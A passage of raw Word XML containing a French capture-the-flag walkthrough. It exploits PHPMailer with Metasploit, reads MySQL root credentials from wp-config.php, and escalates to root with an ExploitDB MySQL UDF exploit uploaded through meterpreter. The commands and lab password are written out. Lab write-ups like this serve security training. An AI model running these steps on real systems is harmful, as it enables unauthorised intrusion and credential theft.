      </w:r>
      <w:r>
        <w:t xml:space="preserve"> On précise le « </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C42680">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>triggeruri</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t> » comme étant la racine « </w:t>
      </w:r>
      <w:r w:rsidRPr="00C42680">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>/ </w:t>
      </w:r>
      <w:r>
        <w:t>», car o</w:t>
      </w:r>
      <w:r w:rsidRPr="00C42680">
        <w:t>n a chang</w:t>
      </w:r>
      <w:r>
        <w:t>é</w:t>
      </w:r>
      <w:r w:rsidRPr="00C42680">
        <w:t xml:space="preserve"> le</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> « </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C42680">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>targeturi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> » : autrement on pourrait voir l’exploit tenter de charger le </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>payload</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> depuis « </w:t>
      </w:r>
      <w:r w:rsidRPr="00C42680">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C42680">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>contact.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C42680">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>/&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C42680">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>payload</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C42680">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>&gt;.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C42680">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t> », or il est écrit à la racine : « </w:t>
      </w:r>
      <w:r w:rsidRPr="00C42680">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>/var/www/html/&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C42680">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>payload</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C42680">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>&gt;.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C42680">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t> »)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D54D536" w14:textId="77777777" w:rsidR="00C93149" w:rsidRDefault="00C93149" w:rsidP="00C93149">
      <w:r w:rsidRPr="00C42680">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Remarque :</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Pour gagner du temps il est possible de changer le délai avant l’exécution du </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>payload</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> avec la commande « </w:t>
      </w:r>
      <w:r w:rsidRPr="00C42680">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">set </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C42680">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>wait_timeout</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C42680">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> X</w:t>
      </w:r>
      <w:r>
        <w:t> », « X » étant le temps en secondes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B82691E" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1">
      <w:pPr>
        <w:spacing w:before="0" w:after="160" w:line="259" w:lineRule="auto"/>
        <w:jc w:val="left"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D8F5AC7" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1">
      <w:pPr>
        <w:spacing w:before="0" w:after="160" w:line="259" w:lineRule="auto"/>
        <w:jc w:val="left"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2FD2D00E" w14:textId="57DEF3FA" w:rsidR="009D6503" w:rsidRDefault="00A07106" w:rsidP="004D075B">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>L</w:t>
      </w:r>
      <w:r w:rsidR="009D6503" w:rsidRPr="005312DC">
        <w:t>es options</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009D6503">
        <w:t>devraient</w:t>
      </w:r>
      <w:r w:rsidR="004C2A12">
        <w:t xml:space="preserve"> alors</w:t>
      </w:r>
      <w:r w:rsidR="009D6503">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="004C2A12">
        <w:t>être comme ci-dessous</w:t>
      </w:r>
      <w:r w:rsidR="009D6503">
        <w:t> :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28D0277A" w14:textId="5F3B5250" w:rsidR="002305CD" w:rsidRDefault="00A07106" w:rsidP="009D6503">
      <w:r w:rsidRPr="00A07106">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="01D1A27B" wp14:editId="6542604C">
            <wp:extent cx="6645910" cy="4868545"/>
            <wp:effectExtent l="0" t="0" r="2540" b="8255"/>
            <wp:docPr id="152849400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9400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F4E3" w14:textId="77777777" w:rsidR="009D6503" w:rsidRPr="005312DC" w:rsidRDefault="009D6503" w:rsidP="009D6503">
      <w:r>
        <w:t>Exécuter l’exploit :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73949DF3" w14:textId="138B8C37" w:rsidR="009D6503" w:rsidRDefault="009D6503" w:rsidP="009D6503">
      <w:pPr>
        <w:ind w:firstLine="708"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00993515">
        <w:t>msf</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00993515">
        <w:t>6 exploit(multi/http/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00993515">
        <w:t>phpmailer_arg_injection</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00993515">
        <w:t>) &gt; exploi</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="277C6C4A" w14:textId="232CE85C" w:rsidR="009D6503" w:rsidRDefault="00DB2675" w:rsidP="009D6503">
      <w:r w:rsidRPr="00DB2675">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0CDAC92C" wp14:editId="2847EB83">
            <wp:extent cx="6645910" cy="1364615"/>
            <wp:effectExtent l="0" t="0" r="2540" b="6985"/>
            <wp:docPr id="67488824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8824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34CC" w14:textId="5BB2A2CC" w:rsidR="00F369AF" w:rsidRDefault="00F369AF" w:rsidP="009D6503">
      <w:r>
        <w:t>Trouver le flag 2 :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62E072FE" w14:textId="74F3E4F5" w:rsidR="00F369AF" w:rsidRDefault="00F369AF" w:rsidP="009D6503">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4FFCE07E" wp14:editId="70D53923">
            <wp:extent cx="6362700" cy="1552575"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="19655146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C9D1C" w14:textId="4D020C77" w:rsidR="00F369AF" w:rsidRDefault="004C2A12" w:rsidP="004C2A12">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Trouver de quoi é</w:t>
      </w:r>
      <w:r w:rsidR="00F369AF">
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidR="00F369AF">
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r w:rsidR="00F369AF">
        <w:t xml:space="preserve"> verticale</w:t>
      </w:r>
      <w:r>
        <w:t>ment</w:t>
      </w:r>
      <w:r w:rsidR="00F369AF">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00F369AF">
        <w:t>es privilèges</w:t>
      </w:r>
      <w:r>
        <w:t> :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41BF291C" w14:textId="0804F01D" w:rsidR="004C2A12" w:rsidRPr="008D52B9" w:rsidRDefault="004C2A12" w:rsidP="004C2A12">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="008D52B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>meterpreter &gt; shell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D23E6AF" w14:textId="77777777" w:rsidR="00F369AF" w:rsidRPr="004C2A12" w:rsidRDefault="00F369AF" w:rsidP="004C2A12">
      <w:pPr>
        <w:ind w:firstLine="708"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004C2A12">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">cat </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004C2A12">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>wordpress</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004C2A12">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/wp-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004C2A12">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>config.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="55559E1E" w14:textId="77777777" w:rsidR="00F369AF" w:rsidRDefault="00F369AF" w:rsidP="00F369AF">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3DF9DDC5" wp14:editId="35BDA57C">
            <wp:extent cx="5324475" cy="1924050"/>
            <wp:effectExtent l="0" t="0" r="9525" b="0"/>
            <wp:docPr id="1710882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25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B6DF" w14:textId="77777777" w:rsidR="00F369AF" w:rsidRPr="009A5BF0" w:rsidRDefault="00F369AF" w:rsidP="00F369AF">
      <w:r w:rsidRPr="009A5BF0">
        <w:t>Connection à MySQL avec l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">es identifiant root découvert en clair dans le </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>wp-config.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t> :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A3757EA" w14:textId="62A5005A" w:rsidR="00F369AF" w:rsidRDefault="00F369AF" w:rsidP="00F369AF">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009A5BF0">
        <w:tab/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009A5BF0">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>mysql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009A5BF0">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -u roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>t -p</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="583469BF" w14:textId="77777777" w:rsidR="00F369AF" w:rsidRPr="009A5BF0" w:rsidRDefault="00F369AF" w:rsidP="00F369AF">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>Enter password: R@v3nSecurity</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DC9B800" w14:textId="77777777" w:rsidR="00F369AF" w:rsidRDefault="00F369AF" w:rsidP="00F369AF">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4782547F" wp14:editId="7864D8C7">
            <wp:extent cx="6645910" cy="2797175"/>
            <wp:effectExtent l="0" t="0" r="2540" b="3175"/>
            <wp:docPr id="8301255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25558" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill rotWithShape="1">
                    <a:blip r:embed="rId24"/>
                    <a:srcRect t="22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9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A4BC40" w14:textId="77777777" w:rsidR="00F369AF" w:rsidRDefault="00F369AF" w:rsidP="00F369AF">
      <w:r w:rsidRPr="00AE1B69">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Remarque :</w:t>
      </w:r>
      <w:r w:rsidRPr="009A5BF0">
        <w:t xml:space="preserve"> on a à p</w:t>
      </w:r>
      <w:r>
        <w:t>résent la version de MySQL utilisée : 5.5.60</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="391CE2A2" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="00F369AF"/>
    <w:p w14:paraId="40D6E4F3" w14:textId="77777777" w:rsidR="00F369AF" w:rsidRDefault="00F369AF" w:rsidP="00F369AF">
      <w:r>
        <w:t>Nous avons donc bien accès à MySQL en tant que root. Si on parvenait à faire exécuter un fichier à MySQL par une « fonction utilisateur » (« </w:t>
      </w:r>
      <w:r w:rsidRPr="00C37747">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>User-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C37747">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Defined</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C37747">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C37747">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Function</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t> ») : le processus devrait alors aussi être créé en tant que « root », ce qui pourrait nous permettre d’élever nos privilèges</w:t>
      </w:r>
      <w:r w:rsidRPr="00C37747">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">localement. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F1A284E" w14:textId="77777777" w:rsidR="00F369AF" w:rsidRDefault="00F369AF" w:rsidP="00F369AF">
      <w:r>
        <w:t xml:space="preserve">Par ailleurs, nous constatons qu’en tant qu’utilisateur « www-data » nous n’avons aucun droit d’exécution des fichiers. On peut en revanche appeler python. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14EAFAD1" w14:textId="242F3DD7" w:rsidR="00F369AF" w:rsidRDefault="00F369AF" w:rsidP="00F369AF">
      <w:r>
        <w:t>Nous allons donc chercher dans l</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>’«</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C37747">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>ExploitDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> » une élévation locale de privilège pour linux (x86, comme notre </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>), en python, et compatible avec notre version de MySQL (5.5.60).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="648F3CAE" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="00F369AF"/>
    <w:p w14:paraId="15A4D010" w14:textId="77777777" w:rsidR="00F369AF" w:rsidRDefault="00F369AF" w:rsidP="00F369AF">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Dans un autre terminal Kali, on interroge l’</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ExploitDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t> :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ECEA8C3" w14:textId="77777777" w:rsidR="00F369AF" w:rsidRDefault="00F369AF" w:rsidP="00F369AF">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve">$ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>searchsploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> MySQL Linux</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="092D2E77" w14:textId="77777777" w:rsidR="00F369AF" w:rsidRDefault="00F369AF" w:rsidP="00F369AF">
      <w:r>
        <w:t>On trouve un exploit qui pourrait convenir :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="255C34D1" w14:textId="77777777" w:rsidR="00F369AF" w:rsidRDefault="00F369AF" w:rsidP="00F369AF">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3B8A8DB9" wp14:editId="4D6BD44A">
            <wp:extent cx="6645910" cy="140970"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:docPr id="10221829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82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087F" w14:textId="77777777" w:rsidR="00F369AF" w:rsidRDefault="00F369AF" w:rsidP="00F369AF">
      <w:r>
        <w:t>On en localise l’emplacement (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>path</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>) :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B49D06C" w14:textId="77777777" w:rsidR="00F369AF" w:rsidRDefault="00F369AF" w:rsidP="00F369AF">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve">$ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>locate</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="001001B2">
        <w:t>linux</w:t>
      </w:r>
      <w:r>
        <w:t>_x86</w:t>
      </w:r>
      <w:r w:rsidRPr="001001B2">
        <w:t>/local/</w:t>
      </w:r>
      <w:r>
        <w:t>46</w:t>
      </w:r>
      <w:r w:rsidRPr="001001B2">
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:t>49</w:t>
      </w:r>
      <w:r w:rsidRPr="001001B2">
        <w:t>.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19CD825F" w14:textId="77777777" w:rsidR="00F369AF" w:rsidRDefault="00F369AF" w:rsidP="00F369AF">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve">Copier le </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>path</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t> : « </w:t>
      </w:r>
      <w:r w:rsidRPr="001001B2">
        <w:t>/usr/share/exploitdb/exploits/linux/local/</w:t>
      </w:r>
      <w:r>
        <w:t>46</w:t>
      </w:r>
      <w:r w:rsidRPr="001001B2">
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:t>49</w:t>
      </w:r>
      <w:r w:rsidRPr="001001B2">
        <w:t>.py</w:t>
      </w:r>
      <w:r>
        <w:t> » (« Ctrl + Maj + C »)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C0F46C2" w14:textId="77777777" w:rsidR="00F369AF" w:rsidRDefault="00F369AF" w:rsidP="00F369AF">
      <w:r>
        <w:t xml:space="preserve">De retour dans le </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>shell</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> (« </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>mysql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> &gt; »), taper « Ctrl + C » puis « y » pour revenir au </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>, puis télécharger l’exploit sur la cible :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="711A6EEB" w14:textId="77777777" w:rsidR="00F369AF" w:rsidRDefault="00F369AF" w:rsidP="00F369AF">
      <w:bookmarkStart w:id="4" w:name="_Hlk210386610"/>
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> &gt; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00914400">
        <w:t>upload</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00914400">
        <w:t xml:space="preserve"> /usr/share/exploitdb/exploits/linux_x86/local/46249.py 46249.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E1E23AF" w14:textId="77777777" w:rsidR="00F369AF" w:rsidRDefault="00F369AF" w:rsidP="00F369AF">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve">(Coller le </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>path</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> avec « Ctrl + Maj + V »)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="054BC339" w14:textId="77777777" w:rsidR="00F369AF" w:rsidRDefault="00F369AF" w:rsidP="00F369AF">
      <w:r w:rsidRPr="00AE1B69">
        <w:t>Puis exécuter l’exploit avec l</w:t>
      </w:r>
      <w:r>
        <w:t>es identifiants root de MySQL :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="468D2298" w14:textId="77777777" w:rsidR="00F369AF" w:rsidRPr="00AE1B69" w:rsidRDefault="00F369AF" w:rsidP="00F369AF">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00AE1B69">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>python 46249.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> --username root --password R@v3nSecurity</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="4"/>
    <w:p w14:paraId="2F750699" w14:textId="77777777" w:rsidR="00F369AF" w:rsidRPr="001001B2" w:rsidRDefault="00F369AF" w:rsidP="00F369AF">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3CBBEBCE" wp14:editId="10521E46">
            <wp:extent cx="6645910" cy="1578610"/>
            <wp:effectExtent l="0" t="0" r="2540" b="2540"/>
            <wp:docPr id="10166770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770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EC35" w14:textId="77777777" w:rsidR="00F369AF" w:rsidRDefault="00F369AF" w:rsidP="00F369AF">
      <w:r w:rsidRPr="00AE1B69">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Remarque :</w:t>
      </w:r>
      <w:r w:rsidRPr="00AE1B69">
        <w:t xml:space="preserve"> nous v</w:t>
      </w:r>
      <w:r>
        <w:t>oyons que nous sommes devenus « </w:t>
      </w:r>
      <w:r w:rsidRPr="00AE1B69">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>root </w:t>
      </w:r>
      <w:r>
        <w:t>» car l’invite de commande est devenue un « </w:t>
      </w:r>
      <w:r w:rsidRPr="00AE1B69">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:t> », ce qui est confirmé par la commande « </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AE1B69">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>whoami</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AE1B69">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:t>» qui nous retourne bien que nous sommes « </w:t>
      </w:r>
      <w:r w:rsidRPr="00AE1B69">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>root </w:t>
      </w:r>
      <w:r>
        <w:t>».</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2333F73E" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="00F369AF"/>
    <w:p w14:paraId="679471D0" w14:textId="77777777" w:rsidR="00F369AF" w:rsidRDefault="00F369AF" w:rsidP="00F369AF">
      <w:r>
        <w:t>Trouver le flag 4 :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F824392" w14:textId="73672714" w:rsidR="004C2A12" w:rsidRPr="004C2A12" w:rsidRDefault="00F369AF" w:rsidP="004C2A12">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="39600E24" wp14:editId="350B4316">
            <wp:extent cx="4505325" cy="2000250"/>
            <wp:effectExtent l="0" t="0" r="9525" b="0"/>
            <wp:docPr id="17667544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544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76C2" w14:textId="239B60E4" w:rsidR="0011545A" w:rsidRDefault="0011545A" w:rsidP="0011545A">
      <w:pPr>
        <w:pStyle w:val="Titre2"/>
      </w:pPr>
      <w:bookmarkStart w:id="5" w:name="_Toc210403957"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Etape 2 : </w:t>
      </w:r>
      <w:r w:rsidR="004C2A12">
        <w:t>Intrusion initiale dans</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> le LAN</w:t>
      </w:r>
      <w:bookmarkEnd w:id="5"/>
    </w:p>
    <w:p w14:paraId="14C23574" w14:textId="168714AF" w:rsidR="0011545A" w:rsidRDefault="0011545A" w:rsidP="009A1FC6">
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>BufferOverflow</w:t>
      </w:r>
